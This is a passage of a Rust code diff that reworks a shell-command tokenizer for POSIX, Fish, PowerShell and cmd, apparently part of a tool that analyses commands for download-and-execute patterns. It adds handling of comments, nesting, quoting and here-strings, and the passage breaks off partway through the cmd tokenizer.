@@ -43,14 +43,14 @@ pub struct Segment {
 /// Tokenize a command string according to shell type.
 pub fn tokenize(input: &str, shell: ShellType) -> Vec<Segment> {
     match shell {
-        ShellType::Posix => tokenize_posix(input),
+        ShellType::Posix => tokenize_posix(input, true),
         ShellType::Fish => tokenize_fish(input),
         ShellType::PowerShell => tokenize_powershell(input),
         ShellType::Cmd => tokenize_cmd(input),
     }
 }
 
-fn tokenize_posix(input: &str) -> Vec<Segment> {
+fn tokenize_posix(input: &str, bash_function_names: bool) -> Vec<Segment> {
     let mut segments = Vec::new();
     let mut current = String::new();
     let mut preceding_sep = None;
@@ -58,6 +58,20 @@ fn tokenize_posix(input: &str) -> Vec<Segment> {
     let chars: Vec<char> = input.chars().collect();
     let len = chars.len();
     let mut i = 0;
+    // A POSIX `#` begins a comment only at the start of a shell word. Keep
+    // that lexical state explicitly: looking at the preceding source
+    // character misclassifies both braces embedded in words and a newline
+    // removed by backslash continuation.
+    let mut at_word_start = true;
+    // Control operators inside command/arithmetic/process substitutions,
+    // subshells, and function/brace bodies are not top-level segment
+    // boundaries. Keep a small lexical nesting state here; executable bodies
+    // are recovered separately by `extract::executable_substitutions`.
+    let mut paren_depth = 0usize;
+    // `true` marks a `${...}` word scope; `false` marks a reserved-word brace
+    // group. The distinction matters because parameter braces stay within the
+    // current word while grouping braces start/end shell words.
+    let mut brace_scopes: Vec<bool> = Vec::new();
 
     while i < len {
         let ch = chars[i];
@@ -66,6 +80,9 @@ fn tokenize_posix(input: &str) -> Vec<Segment> {
             '\\' if i + 1 < len => {
                 current.push(chars[i]);
                 current.push(chars[i + 1]);
+                if chars[i + 1] != '\n' {
+                    at_word_start = false;
+                }
                 i += 2;
                 continue;
             }
@@ -81,6 +98,7 @@ fn tokenize_posix(input: &str) -> Vec<Segment> {
                     current.push(chars[i]);
                     i += 1;
                 }
+                at_word_start = false;
                 continue;
             }
             // Double quotes: backslash escaping allowed inside.
@@ -101,11 +119,62 @@ fn tokenize_posix(input: &str) -> Vec<Segment> {
                     current.push(chars[i]);
                     i += 1;
                 }
+                at_word_start = false;
                 continue;
             }
-            '|' => {
+            '#' if at_word_start => {
+                // Comments are not argv and syntax inside them cannot affect
+                // delimiter depth. Leave the newline for the normal segment
+                // boundary arm so the following command is still analyzed.
+                while i < len && chars[i] != '\n' {
+                    i += 1;
+                }
+                continue;
+            }
+            '(' => {
+                paren_depth = paren_depth.saturating_add(1);
+                current.push(ch);
+                at_word_start = true;
+                i += 1;
+                continue;
+            }
+            ')' if paren_depth > 0 => {
+                paren_depth -= 1;
+                current.push(ch);
+                at_word_start = true;
+                i += 1;
+                continue;
+            }
+            '{' if ends_with_unescaped_char(&current, '$', '\\')
+                || (posix_reserved_word_boundary_after(&chars, i)
+                    && ((!brace_scopes.is_empty() && at_word_start)
+                        || opens_posix_brace_scope(
+                            &current,
+                            paren_depth,
+                            bash_function_names,
+                        ))) =>
+            {
+                let embedded_in_word = ends_with_unescaped_char(&current, '$', '\\');
+                brace_scopes.push(embedded_in_word);
+                current.push(ch);
+                at_word_start = !embedded_in_word;
+                i += 1;
+                continue;
+            }
+            '}' if brace_scopes.last().is_some_and(|embedded_in_word| {
+                *embedded_in_word
+                    || (at_word_start && posix_reserved_word_boundary_after(&chars, i))
+            }) =>
+            {
+                let embedded_in_word = brace_scopes.pop().unwrap_or(false);
+                current.push(ch);
+                at_word_start = !embedded_in_word;
+                i += 1;
+                continue;
+            }
+            '|' if paren_depth == 0 && brace_scopes.is_empty() => {
                 if i + 1 < len && chars[i + 1] == '|' {
-                    push_segment(
+                    push_posix_segment(
                         &mut segments,
                         &current,
                         preceding_sep.take(),
@@ -113,12 +182,13 @@ fn tokenize_posix(input: &str) -> Vec<Segment> {
                         &mut search_cursor,
                     );
                     current.clear();
+                    at_word_start = true;
                     preceding_sep = Some("||".to_string());
                     i += 2;
                     continue;
                 } else if i + 1 < len && chars[i + 1] == '&' {
                     // |& (bash: pipe stderr too)
-                    push_segment(
+                    push_posix_segment(
                         &mut segments,
                         &current,
                         preceding_sep.take(),
@@ -126,11 +196,12 @@ fn tokenize_posix(input: &str) -> Vec<Segment> {
                         &mut search_cursor,
                     );
                     current.clear();
+                    at_word_start = true;
                     preceding_sep = Some("|&".to_string());
                     i += 2;
                     continue;
                 } else {
-                    push_segment(
+                    push_posix_segment(
                         &mut segments,
                         &current,
                         preceding_sep.take(),
@@ -138,13 +209,18 @@ fn tokenize_posix(input: &str) -> Vec<Segment> {
                         &mut search_cursor,
                     );
                     current.clear();
+                    at_word_start = true;
                     preceding_sep = Some("|".to_string());
                     i += 1;
                     continue;
                 }
             }
-            '&' if i + 1 < len && chars[i + 1] == '&' => {
-                push_segment(
+            '&' if paren_depth == 0
+                && brace_scopes.is_empty()
+                && i + 1 < len
+                && chars[i + 1] == '&' =>
+            {
+                push_posix_segment(
                     &mut segments,
                     &current,
                     preceding_sep.take(),
@@ -152,12 +228,20 @@ fn tokenize_posix(input: &str) -> Vec<Segment> {
                     &mut search_cursor,
                 );
                 current.clear();
+                at_word_start = true;
                 preceding_sep = Some("&&".to_string());
                 i += 2;
                 continue;
             }
-            ';' => {
-                push_segment(
+            // POSIX/Fish single `&` terminates an asynchronous command. Keep
+            // fd-duplication and combined-redirection forms (`2>&1`, `0<&1`,
+            // `&>file`) inside the current segment.
+            '&' if paren_depth == 0
+                && brace_scopes.is_empty()
+                && !ends_with_unescaped_redirection(&current, '\\')
+                && !(i + 1 < len && chars[i + 1] == '>') =>
+            {
+                push_posix_segment(
                     &mut segments,
                     &current,
                     preceding_sep.take(),
@@ -165,12 +249,27 @@ fn tokenize_posix(input: &str) -> Vec<Segment> {
                     &mut search_cursor,
                 );
                 current.clear();
+                at_word_start = true;
+                preceding_sep = Some("&".to_string());
+                i += 1;
+                continue;
+            }
+            ';' if paren_depth == 0 && brace_scopes.is_empty() => {
+                push_posix_segment(
+                    &mut segments,
+                    &current,
+                    preceding_sep.take(),
+                    input,
+                    &mut search_cursor,
+                );
+                current.clear();
+                at_word_start = true;
                 preceding_sep = Some(";".to_string());
                 i += 1;
                 continue;
             }
-            '\n' => {
-                push_segment(
+            '\n' if paren_depth == 0 && brace_scopes.is_empty() => {
+                push_posix_segment(
                     &mut segments,
                     &current,
                     preceding_sep.take(),
@@ -178,18 +277,26 @@ fn tokenize_posix(input: &str) -> Vec<Segment> {
                     &mut search_cursor,
                 );
                 current.clear();
+                at_word_start = true;
                 preceding_sep = Some("\n".to_string());
                 i += 1;
                 continue;
             }
             _ => {
                 current.push(ch);
+                at_word_start = match ch {
+                    ' ' | '\t' | '\n' => true,
+                    // Control/redirection operators begin a new shell word
+                    // even when they occur inside a nested lexical scope.
+                    ';' | '&' | '|' | '<' | '>' => true,
+                    _ => false,
+                };
                 i += 1;
             }
         }
     }
 
-    push_segment(
+    push_posix_segment(
         &mut segments,
         &current,
         preceding_sep.take(),
@@ -199,10 +306,442 @@ fn tokenize_posix(input: &str) -> Vec<Segment> {
     segments
 }
 
+/// Whether the current token really ends in a redirection operator.  Looking
+/// only at the final character confuses an escaped literal (`\\>` in POSIX,
+/// `` `> `` in PowerShell) with syntax and can hide an adjacent `&` command
+/// boundary.
+fn ends_with_unescaped_redirection(raw: &str, escape: char) -> bool {
+    raw.chars().next_back().is_some_and(|last| {
+        matches!(last, '>' | '<') && ends_with_unescaped_char(raw, last, escape)
+    })
+}
+
+fn ends_with_unescaped_char(raw: &str, expected: char, escape: char) -> bool {
+    let mut chars = raw.chars().rev();
+    let Some(last) = chars.next() else {
+        return false;
+    };
+    if last != expected {
+        return false;
+    }
+    let escapes = chars.take_while(|ch| *ch == escape).count();
+    escapes % 2 == 0
+}
+
+fn is_posix_syntax_whitespace(ch: char) -> bool {
+    matches!(ch, ' ' | '\t' | '\n')
+}
+
+fn posix_reserved_word_boundary_after(chars: &[char], index: usize) -> bool {
+    chars.get(index + 1).is_none_or(|next| {
+        is_posix_syntax_whitespace(*next)
+            || matches!(next, ';' | '&' | '|' | '(' | ')' | '<' | '>' | '{' | '}')
+    })
+}
+
+fn opens_posix_brace_scope(current: &str, paren_depth: usize, bash_function_names: bool) -> bool {
+    let trimmed = current.trim_end_matches(is_posix_syntax_whitespace);
+    if trimmed.is_empty()
+        || (paren_depth > 0
+            && trimmed
+                .chars()
+                .last()
+                .is_some_and(|ch| matches!(ch, '(' | ';' | '&' | '|')))
+    {
+        return true;
+    }
+
+    let words = split_words(trimmed);
+    if words
+        .first()
+        .is_some_and(|word| word.eq_ignore_ascii_case("coproc"))
+        && words.len() <= 2
+    {
+        // Bash named coprocess: `coproc NAME { command; }`.
+        return true;
+    }
+
+    looks_like_posix_function_header(trimmed, bash_function_names)
+}
+
+fn looks_like_posix_function_header(raw: &str, bash_function_names: bool) -> bool {
+    fn strip_continued_keyword<'a>(raw: &'a str, keyword: &[u8]) -> Option<&'a str> {
+        let bytes = raw.as_bytes();
+        let mut input_index = 0usize;
+        let mut keyword_index = 0usize;
+        while keyword_index < keyword.len() {
+            while bytes.get(input_index) == Some(&b'\\')
+                && bytes.get(input_index + 1) == Some(&b'\n')
+            {
+                input_index += 2;
+            }
+            if bytes.get(input_index) != keyword.get(keyword_index) {
+                return None;
+            }
+            input_index += 1;
+            keyword_index += 1;
+        }
+        while bytes.get(input_index) == Some(&b'\\') && bytes.get(input_index + 1) == Some(&b'\n') {
+            input_index += 2;
+        }
+        raw.get(input_index..)
+    }
+
+    fn valid_name(name: &str, allow_equal: bool) -> bool {
+        let name = name.replace("\\\n", "");
+        !name.is_empty()
+            && name.chars().all(|ch| {
+                ch != '\0'
+                    && !is_posix_syntax_whitespace(ch)
+                    && !matches!(ch, ';' | '&' | '|' | '<' | '>' | '(' | ')')
+                    && (allow_equal || ch != '=')
+            })
+    }
+
+    fn portable_name(name: &str) -> bool {
+        let mut chars = name.chars();
+        chars
+            .next()
+            .is_some_and(|ch| ch == '_' || ch.is_ascii_alphabetic())
+            && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
+    }
+
+    let trimmed = raw.trim_matches(is_posix_syntax_whitespace);
+    let function_rest = if bash_function_names {
+        strip_continued_keyword(trimmed, b"function")
+    } else {
+        trimmed.strip_prefix("function")
+    };
+    if let Some(rest) = function_rest.filter(|rest| {
+        rest.as_bytes()
+            .first()
+            .is_some_and(|byte| matches!(byte, b' ' | b'\t'))
+    }) {
+        let rest = rest.trim_start_matches(is_posix_syntax_whitespace);
+        let name = rest
+            .strip_suffix("()")
+            .unwrap_or(rest)
+            .trim_end_matches(is_posix_syntax_whitespace);
+        return if bash_function_names {
+            valid_name(name, true)
+        } else {
+            portable_name(name)
+        };
+    }
+
+    let Some(without_close) = trimmed.strip_suffix(')') else {
+        return false;
+    };
+    let Some(open) = without_close.rfind('(') else {
+        return false;
+    };
+    let name = without_close[..open].trim_end_matches(is_posix_syntax_whitespace);
+    without_close[open + 1..]
+        .trim_matches(is_posix_syntax_whitespace)
+        .is_empty()
+        && if bash_function_names {
+            valid_name(name, true) && !is_env_assignment(name)
+        } else {
+            portable_name(name)
+        }
+}
+
 fn tokenize_fish(input: &str) -> Vec<Segment> {
     // Fish differs slightly from POSIX, but POSIX tokenization is close enough
     // for URL extraction.
-    tokenize_posix(input)
+    tokenize_posix(input, false)
+}
+
+/// Distinguish PowerShell's unary call operator from its postfix background
+/// statement terminator.  The expression-leading cases keep `&` in the current
+/// segment so executable script blocks can be recovered recursively.
+pub(crate) fn powershell_ampersand_is_call(prefix: &str) -> bool {
+    let trimmed = prefix.trim_end();
+    if trimmed.is_empty() {
+        return true;
+    }
+    if trimmed
+        .as_bytes()
+        .last()
+        .is_some_and(|byte| b"=([{,;|".contains(byte))
+    {
+        return true;
+    }
+
+    // `return & command` and `throw & command` are expression-leading call
+    // sites only when the keyword itself is the current statement.  Treating
+    // any final data word named `return`/`throw` as syntax keeps a following
+    // background command in the wrong segment (`Write-Output return & ...`).
+    trimmed.eq_ignore_ascii_case("return") || trimmed.eq_ignore_ascii_case("throw")
+}
+
+fn powershell_block_comment_end(indexed: &[(usize, char)], start: usize) -> Option<usize> {
+    if indexed.get(start).map(|(_, ch)| *ch) != Some('<')
+        || indexed.get(start + 1).map(|(_, ch)| *ch) != Some('#')
+    {
+        return None;
+    }
+    let mut i = start + 2;
+    while i + 1 < indexed.len() {
+        if indexed.get(i).map(|(_, ch)| *ch) == Some('#')
+            && indexed.get(i + 1).map(|(_, ch)| *ch) == Some('>')
+        {
+            return Some(i + 2);
+        }
+        i += 1;
+    }
+    None
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum PowerShellQuoteKind {
+    Single,
+    Double,
+}
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum PowerShellTokenClass {
+    Start,
+    Generic,
+    QuoteOnly,
+}
+
+impl PowerShellTokenClass {
+    fn starts_special_token(self) -> bool {
+        !matches!(self, Self::Generic)
+    }
+}
+
+pub(crate) fn powershell_quote_kind(ch: char) -> Option<PowerShellQuoteKind> {
+    match ch {
+        '\'' | '\u{2018}' | '\u{2019}' | '\u{201a}' | '\u{201b}' => {
+            Some(PowerShellQuoteKind::Single)
+        }
+        '"' | '\u{201c}' | '\u{201d}' | '\u{201e}' => Some(PowerShellQuoteKind::Double),
+        _ => None,
+    }
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) struct PowerShellHereString {
+    pub(crate) kind: PowerShellQuoteKind,
+    pub(crate) content_start: usize,
+    pub(crate) content_end: usize,
+    pub(crate) end: usize,
+}
+
+fn is_powershell_horizontal_whitespace(ch: char) -> bool {
+    ch.is_whitespace()
+        && !matches!(
+            ch,
+            '\r' | '\n' | '\u{000b}' | '\u{000c}' | '\u{0085}' | '\u{2028}' | '\u{2029}'
+        )
+}
+
+/// Parse one complete PowerShell here-string at `start`.
+///
+/// PowerShell accepts the same typographic quote classes as ordinary strings.
+/// The opening marker may be followed by horizontal whitespace before its
+/// mandatory physical newline, and the footer may use any scalar from the
+/// opening quote's class (for example, `@\u{201c}` ... `\u{201d}@`).
+pub(crate) fn powershell_here_string(raw: &str, start: usize) -> Option<PowerShellHereString> {
+    if raw.as_bytes().get(start) != Some(&b'@') {
+        return None;
+    }
+
+    let quote_start = start + 1;
+    let quote = raw.get(quote_start..)?.chars().next()?;
+    let kind = powershell_quote_kind(quote)?;
+    let mut index = quote_start + quote.len_utf8();
+    while let Some(ch) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+        if !is_powershell_horizontal_whitespace(ch) {
+            break;
+        }
+        index += ch.len_utf8();
+    }
+
+    match raw.get(index..).and_then(|suffix| suffix.chars().next())? {
+        '\n' => index += 1,
+        '\r' => {
+            index += 1;
+            if raw.as_bytes().get(index) == Some(&b'\n') {
+                index += 1;
+            }
+        }
+        _ => return None,
+    }
+    let content_start = index;
+    let mut at_line_start = true;
+
+    while let Some(ch) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+        if at_line_start && powershell_quote_kind(ch) == Some(kind) {
+            let after_quote = index + ch.len_utf8();
+            if raw.as_bytes().get(after_quote) == Some(&b'@') {
+                return Some(PowerShellHereString {
+                    kind,
+                    content_start,
+                    content_end: index,
+                    end: after_quote + 1,
+                });
+            }
+        }
+
+        index += ch.len_utf8();
+        at_line_start = match ch {
+            '\n' => true,
+            '\r' => raw.as_bytes().get(index) != Some(&b'\n'),
+            _ => false,
+        };
+    }
+    None
+}
+
+fn powershell_stop_parsing_token(
+    indexed: &[(usize, char)],
+    index: usize,
+    token_class: PowerShellTokenClass,
+) -> bool {
+    token_class.starts_special_token()
+        && indexed.get(index).map(|(_, ch)| *ch) == Some('-')
+        && indexed.get(index + 1).map(|(_, ch)| *ch) == Some('-')
+        && indexed.get(index + 2).map(|(_, ch)| *ch) == Some('%')
+        && indexed
+            .get(index + 3)
+            .map(|(_, ch)| *ch)
+            .is_none_or(|next| {
+                next.is_whitespace()
+                    || matches!(next, '&' | '(' | ')' | ',' | ';' | '{' | '|' | '}')
+            })
+}
+
+/// Split one PowerShell segment into effective lexical words while preserving
+/// the segment's original spelling and byte range. PowerShell recognizes all
+/// Unicode whitespace, and an unquoted/double-quoted backtick newline removes
+/// both characters instead of creating a word boundary.
+fn split_powershell_words(input: &str) -> Vec<String> {
+    let chars: Vec<char> = input.chars().collect();
+    let byte_offsets: Vec<usize> = input.char_indices().map(|(offset, _)| offset).collect();
+    let mut words = Vec::new();
+    let mut current = String::new();
+    let mut quote: Option<PowerShellQuoteKind> = None;
+    let mut index = 0usize;
+
+    while index < chars.len() {
+        let ch = chars[index];
+        if let Some(kind) = quote {
+            if kind == PowerShellQuoteKind::Single {
+                current.push(ch);
+                if powershell_quote_kind(ch) == Some(PowerShellQuoteKind::Single) {
+                    if chars
+                        .get(index + 1)
+                        .and_then(|next| powershell_quote_kind(*next))
+                        == Some(PowerShellQuoteKind::Single)
+                    {
+                        current.push(chars[index + 1]);
+                        index += 2;
+                    } else {
+                        quote = None;
+                        index += 1;
+                    }
+                } else {
+                    index += 1;
+                }
+                continue;
+            }
+            if ch == '`' {
+                match (chars.get(index + 1), chars.get(index + 2)) {
+                    (Some('\n'), _) => {
+                        index += 2;
+                    }
+                    (Some('\r'), Some('\n')) => {
+                        index += 3;
+                    }
+                    (Some('\r'), _) => {
+                        index += 2;
+                    }
+                    (Some(next), _) => {
+                        current.push(ch);
+                        current.push(*next);
+                        index += 2;
+                    }
+                    (None, _) => {
+                        current.push(ch);
+                        index += 1;
+                    }
+                }
+                continue;
+            }
+            current.push(ch);
+            if powershell_quote_kind(ch) == Some(PowerShellQuoteKind::Double) {
+                quote = None;
+            }
+            index += 1;
+            continue;
+        }
+
+        if ch == '@' {
+            let start = byte_offsets[index];
+            if let Some(here_string) = powershell_here_string(input, start) {
+                while index < chars.len() && byte_offsets[index] < here_string.end {
+                    current.push(chars[index]);
+                    index += 1;
+                }
+                continue;
+            }
+        }
+
+        if let Some(kind) = powershell_quote_kind(ch) {
+            quote = Some(kind);
+            current.push(ch);
+            index += 1;
+            continue;
+        }
+        if ch == '`' {
+            match (chars.get(index + 1), chars.get(index + 2)) {
+                (Some('\n'), _) => index += 2,
+                (Some('\r'), Some('\n')) => index += 3,
+                (Some('\r'), _) => index += 2,
+                (Some(next), _) => {
+                    current.push(ch);
+                    current.push(*next);
+                    index += 2;
+                }
+                (None, _) => {
+                    current.push(ch);
+                    index += 1;
+                }
+            }
+            continue;
+        }
+        if ch.is_whitespace() {
+            if !current.is_empty() {
+                words.push(std::mem::take(&mut current));
+            }
+            index += 1;
+            continue;
+        }
+        current.push(ch);
+        index += 1;
+    }
+    if !current.is_empty() {
+        words.push(current);
+    }
+    words
+}
+
+fn normalize_powershell_segment_words(segment: &mut Segment) {
+    let words = split_powershell_words(&segment.raw);
+    let first_non_assign = words.iter().position(|word| !is_env_assignment(word));
+    match first_non_assign {
+        Some(index) => {
+            segment.command = words.get(index).cloned();
+            segment.args = words.get(index + 1..).unwrap_or_default().to_vec();
+        }
+        None => {
+            segment.command = None;
+            segment.args.clear();
+        }
+    }
 }
 
 fn tokenize_powershell(input: &str) -> Vec<Segment> {
@@ -214,52 +753,170 @@ fn tokenize_powershell(input: &str) -> Vec<Segment> {
     let indexed: Vec<(usize, char)> = input.char_indices().collect();
     let len = indexed.len();
     let mut i = 0;
+    let mut token_class = PowerShellTokenClass::Start;
+    // PowerShell statement separators inside a parenthesized expression or a
+    // script block belong to that nested execution scope.  Keeping them in the
+    // outer segment lets `extract::executable_substitutions` recover the body
+    // once, then feed it through the same rule pipeline as a top-level command.
+    let mut paren_depth = 0usize;
+    let mut brace_depth = 0usize;
 
     while i < len {
         let (byte_off, ch) = indexed[i];
 
         match ch {
-            // Backtick escaping in PowerShell.
+            // Backtick escaping in PowerShell. Preserve source spelling for
+            // `raw`/byte ranges; the argv pass below removes line
+            // continuations from effective words.
             '`' if i + 1 < len => {
                 current.push(indexed[i].1);
                 current.push(indexed[i + 1].1);
-                i += 2;
-                continue;
-            }
-            // Single quotes: literal.
-            '\'' => {
-                current.push(ch);
-                i += 1;
-                while i < len && indexed[i].1 != '\'' {
-                    current.push(indexed[i].1);
-                    i += 1;
-                }
-                if i < len {
-                    current.push(indexed[i].1);
-                    i += 1;
-                }
-                continue;
-            }
-            '"' => {
-                current.push(ch);
-                i += 1;
-                while i < len && indexed[i].1 != '"' {
-                    if indexed[i].1 == '`' && i + 1 < len {
-                        current.push(indexed[i].1);
-                        current.push(indexed[i + 1].1);
-                        i += 2;
+                if indexed[i + 1].1 == '\r' {
+                    if indexed.get(i + 2).map(|(_, ch)| *ch) == Some('\n') {
+                        current.push(indexed[i + 2].1);
+                        i += 3;
                     } else {
+                        i += 2;
+                    }
+                } else {
+                    if indexed[i + 1].1 != '\n' {
+                        token_class = PowerShellTokenClass::Generic;
+                    }
+                    i += 2;
+                }
+                continue;
+            }
+            // Block comments and here-strings are multiline lexical atoms.
+            // Quotes, separators, and comment markers in their data must not
+            // change the state used to find the following real command.
+            '<' if token_class.starts_special_token() && i + 1 < len && indexed[i + 1].1 == '#' => {
+                i = powershell_block_comment_end(&indexed, i).unwrap_or(len);
+                token_class = PowerShellTokenClass::Start;
+                continue;
+            }
+            '@' if token_class.starts_special_token() => {
+                if let Some(here_string) = powershell_here_string(input, byte_off) {
+                    while i < len && indexed[i].0 < here_string.end {
                         current.push(indexed[i].1);
                         i += 1;
                     }
+                    token_class = PowerShellTokenClass::QuoteOnly;
+                    continue;
                 }
-                if i < len {
-                    current.push(indexed[i].1);
-                    i += 1;
-                }
+                current.push(ch);
+                token_class = PowerShellTokenClass::Generic;
+                i += 1;
                 continue;
             }
-            '|' => {
+            // PowerShell treats typographic quotes as string delimiters too.
+            quote @ ('\'' | '"' | '\u{2018}' | '\u{2019}' | '\u{201a}' | '\u{201b}'
+            | '\u{201c}' | '\u{201d}' | '\u{201e}') => {
+                let quote_started_generic = token_class == PowerShellTokenClass::Generic;
+                let kind = powershell_quote_kind(quote).expect("matched PowerShell quote");
+                current.push(ch);
+                i += 1;
+                while i < len {
+                    let nested = indexed[i].1;
+                    if kind == PowerShellQuoteKind::Double && nested == '`' && i + 1 < len {
+                        current.push(indexed[i].1);
+                        current.push(indexed[i + 1].1);
+                        if indexed[i + 1].1 == '\r'
+                            && indexed.get(i + 2).map(|(_, ch)| *ch) == Some('\n')
+                        {
+                            current.push(indexed[i + 2].1);
+                            i += 3;
+                        } else {
+                            i += 2;
+                        }
+                    } else if powershell_quote_kind(nested) == Some(kind) {
+                        current.push(nested);
+                        if kind == PowerShellQuoteKind::Single
+                            && indexed
+                                .get(i + 1)
+                                .and_then(|(_, ch)| powershell_quote_kind(*ch))
+                                == Some(PowerShellQuoteKind::Single)
+                        {
+                            current.push(indexed[i + 1].1);
+                            i += 2;
+                        } else {
+                            i += 1;
+                            break;
+                        }
+                    } else {
+                        current.push(nested);
+                        i += 1;
+                    }
+                }
+                token_class = if quote_started_generic {
+                    PowerShellTokenClass::Generic
+                } else {
+                    PowerShellTokenClass::QuoteOnly
+                };
+                continue;
+            }
+            '#' if token_class.starts_special_token() => {
+                // A hash begins a comment only at a lexical token boundary;
+                // `foo#bar` is one ordinary PowerShell word.
+                while i < len && !matches!(indexed[i].1, '\r' | '\n') {
+                    i += 1;
+                }
+                token_class = PowerShellTokenClass::Start;
+                continue;
+            }
+            // Stop-parsing makes ordinary PowerShell syntax in the remaining
+            // argument text literal. Grammar resumes at a newline or at an
+            // unquoted pipeline/`&&`; semicolons and quoted operators remain
+            // native argument data.
+            '-' if powershell_stop_parsing_token(&indexed, i, token_class) => {
+                let mut in_double_quotes = false;
+                while i < len {
+                    let literal = indexed[i].1;
+                    if matches!(literal, '\r' | '\n')
+                        || (!in_double_quotes
+                            && (literal == '|'
+                                || (literal == '&'
+                                    && indexed.get(i + 1).map(|(_, ch)| *ch) == Some('&'))))
+                    {
+                        break;
+                    }
+                    current.push(literal);
+                    if powershell_quote_kind(literal) == Some(PowerShellQuoteKind::Double) {
+                        in_double_quotes = !in_double_quotes;
+                    }
+                    i += 1;
+                }
+                token_class = PowerShellTokenClass::Generic;
+                continue;
+            }
+            '(' => {
+                paren_depth = paren_depth.saturating_add(1);
+                current.push(ch);
+                token_class = PowerShellTokenClass::Start;
+                i += 1;
+                continue;
+            }
+            ')' if paren_depth > 0 => {
+                paren_depth -= 1;
+                current.push(ch);
+                token_class = PowerShellTokenClass::Start;
+                i += 1;
+                continue;
+            }
+            '{' => {
+                brace_depth = brace_depth.saturating_add(1);
+                current.push(ch);
+                token_class = PowerShellTokenClass::Start;
+                i += 1;
+                continue;
+            }
+            '}' if brace_depth > 0 => {
+                brace_depth -= 1;
+                current.push(ch);
+                token_class = PowerShellTokenClass::Start;
+                i += 1;
+                continue;
+            }
+            '|' if paren_depth == 0 && brace_depth == 0 => {
                 // PS 7+ `||` chain op — checked before the single-pipe arm so
                 // `a || b` is one separator, not two pipes (three segments),
                 // which `check_inline_download_execute` relies on.
@@ -272,6 +929,7 @@ fn tokenize_powershell(input: &str) -> Vec<Segment> {
                         &mut search_cursor,
                     );
                     current.clear();
+                    token_class = PowerShellTokenClass::Start;
                     preceding_sep = Some("||".to_string());
                     i += 2;
                     continue;
@@ -284,11 +942,12 @@ fn tokenize_powershell(input: &str) -> Vec<Segment> {
                     &mut search_cursor,
                 );
                 current.clear();
+                token_class = PowerShellTokenClass::Start;
                 preceding_sep = Some("|".to_string());
                 i += 1;
                 continue;
             }
-            ';' => {
+            ';' if paren_depth == 0 && brace_depth == 0 => {
                 push_segment(
                     &mut segments,
                     &current,
@@ -297,13 +956,18 @@ fn tokenize_powershell(input: &str) -> Vec<Segment> {
                     &mut search_cursor,
                 );
                 current.clear();
+                token_class = PowerShellTokenClass::Start;
                 preceding_sep = Some(";".to_string());
                 i += 1;
                 continue;
             }
             // PS 7+ `&&` chain op. The arm guard lets a bare `&` (PS
             // call/background operator) fall through to the catch-all.
-            '&' if i + 1 < len && indexed[i + 1].1 == '&' => {
+            '&' if paren_depth == 0
+                && brace_depth == 0
+                && i + 1 < len
+                && indexed[i + 1].1 == '&' =>
+            {
                 push_segment(
                     &mut segments,
                     &current,
@@ -312,6 +976,7 @@ fn tokenize_powershell(input: &str) -> Vec<Segment> {
                     &mut search_cursor,
                 );
                 current.clear();
+                token_class = PowerShellTokenClass::Start;
                 preceding_sep = Some("&&".to_string());
                 i += 2;
                 continue;
@@ -320,7 +985,12 @@ fn tokenize_powershell(input: &str) -> Vec<Segment> {
             // part of the segment. Once a command/pipeline already precedes
             // it, the same token is the background statement terminator and
             // the following command must be analyzed as a new segment.
-            '&' if !current.trim().is_empty() && !current.ends_with('>') => {
+            '&' if paren_depth == 0
+                && brace_depth == 0
+                && !current.trim().is_empty()
+                && !ends_with_unescaped_redirection(&current, '`')
+                && !powershell_ampersand_is_call(&current) =>
+            {
                 push_segment(
                     &mut segments,
                     &current,
@@ -329,12 +999,16 @@ fn tokenize_powershell(input: &str) -> Vec<Segment> {
                     &mut search_cursor,
                 );
                 current.clear();
+                token_class = PowerShellTokenClass::Start;
                 preceding_sep = Some("&".to_string());
                 i += 1;
                 continue;
             }
             // PowerShell logical `-and` / `-or` operators.
-            '-' if current.ends_with(char::is_whitespace) || current.is_empty() => {
+            '-' if paren_depth == 0
+                && brace_depth == 0
+                && (current.ends_with(char::is_whitespace) || current.is_empty()) =>
+            {
                 let remaining = &input[byte_off..];
                 if remaining.starts_with("-and")
                     && remaining[4..]
@@ -350,6 +1024,7 @@ fn tokenize_powershell(input: &str) -> Vec<Segment> {
                         &mut search_cursor,
                     );
                     current.clear();
+                    token_class = PowerShellTokenClass::Start;
                     preceding_sep = Some("-and".to_string());
                     i += 4;
                     continue;
@@ -367,14 +1042,16 @@ fn tokenize_powershell(input: &str) -> Vec<Segment> {
                         &mut search_cursor,
                     );
                     current.clear();
+                    token_class = PowerShellTokenClass::Start;
                     preceding_sep = Some("-or".to_string());
                     i += 3;
                     continue;
                 }
                 current.push(ch);
+                token_class = PowerShellTokenClass::Generic;
                 i += 1;
             }
-            '\n' => {
+            '\r' | '\n' if paren_depth == 0 && brace_depth == 0 => {
                 push_segment(
                     &mut segments,
                     &current,
@@ -383,12 +1060,25 @@ fn tokenize_powershell(input: &str) -> Vec<Segment> {
                     &mut search_cursor,
                 );
                 current.clear();
+                token_class = PowerShellTokenClass::Start;
                 preceding_sep = Some("\n".to_string());
-                i += 1;
+                i += if ch == '\r' && indexed.get(i + 1).map(|(_, next)| *next) == Some('\n') {
+                    2
+                } else {
+                    1
+                };
                 continue;
             }
             _ => {
                 current.push(ch);
+                token_class = match ch {
+                    ch if ch.is_whitespace() => PowerShellTokenClass::Start,
+                    ',' | ';' | '&' | '|' | '=' | '(' | ')' | '{' | '}' => {
+                        PowerShellTokenClass::Start
+                    }
+                    '<' | '>' if token_class.starts_special_token() => PowerShellTokenClass::Start,
+                    _ => PowerShellTokenClass::Generic,
+                };
                 i += 1;
             }
         }
@@ -401,6 +1091,10 @@ fn tokenize_powershell(input: &str) -> Vec<Segment> {
         input,
         &mut search_cursor,
     );
+    for segment in &mut segments {
+        normalize_powershell_segment_words(segment);
+    }
+    segments.retain(|segment| !segment.raw.chars().all(char::is_whitespace));
     segments
 }
 
@@ -412,8 +1106,36 @@ fn tokenize_cmd(input: &str) -> Vec<Segment> {
     let chars: Vec<char> = input.chars().collect();
     let len = chars.len();
     let mut i = 0;
+    let mut paren_depth = 0usize;
 
     while i < len {
+        // REM/@REM and batch labels consume their physical line before quote
+        // handling. A quote in ignored data must not swallow commands on later
+        // lines. `current` may retain a parenthesized group's previous lines,
+        // so test only the suffix after the most recent newline.
+        let at_physical_line_start = current
+            .rsplit('\n')
